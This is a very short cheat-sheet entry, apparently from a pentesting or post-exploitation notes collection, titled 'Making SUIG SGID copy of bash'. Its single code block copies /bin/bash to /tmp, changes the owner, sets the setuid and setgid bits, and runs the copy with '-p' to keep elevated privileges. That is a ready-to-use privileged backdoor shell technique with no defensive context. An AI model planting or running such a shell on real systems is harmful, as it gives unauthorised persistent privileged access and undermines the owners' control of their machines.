## Linux

### Making SUIG SGID copy of bash

```
/bin/cp /bin/bash /tmp/tom; /bin/chown tom:admin /tmp/tom; chmod g+s /tmp/tom; chmod u+s /tmp/tom
/tmp/tom -p
```
